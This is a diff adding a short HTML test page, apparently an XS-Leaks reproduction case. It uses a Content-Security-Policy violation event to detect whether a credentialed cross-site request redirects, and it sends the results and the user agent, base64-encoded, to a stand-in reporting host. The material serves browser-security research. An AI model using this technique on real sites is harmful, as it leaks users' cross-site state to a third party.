@@ -1,0 +1,39 @@
+<!-- Set the Content-Security-Policy to only allow example.org -->
+<meta http-equiv="Content-Security-Policy"
+      content="connect-src https://leak.test https://re.port">
+
+<script>
+    var results = [];
+
+    function run(url) {
+        // Listen for a CSP violation event
+        document.onsecuritypolicyviolation = function () {
+            console.log("Detected a redirect to somewhere other than leak.test");
+            results.push(url);
+        };
+        fetch(url, {
+            mode: 'no-cors',
+            credentials: 'include'
+        });
+        /*xhr = new XMLHttpRequest();
+        xhr.open("GET", url);
+        xhr.withCredentials = true;
+        xhr.send();*/
+    }
+
+    function report() {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "https://re.port/case10.json/" + btoa(JSON.stringify({
+            "user-agent": navigator.userAgent,
+            "cross_site_redirects": results,
+            "xsleak_reproduced": results[0] === "https://leak.test/cross_site_redirect" && results.length === 1
+        })));
+        xhr.send();
+    }
+
+    run("https://leak.test/cross_site_redirect");
+    setTimeout(function () {
+        run("https://leak.test/", report);
+    }, 2000);
+    setTimeout(report, 4000);
+</script>
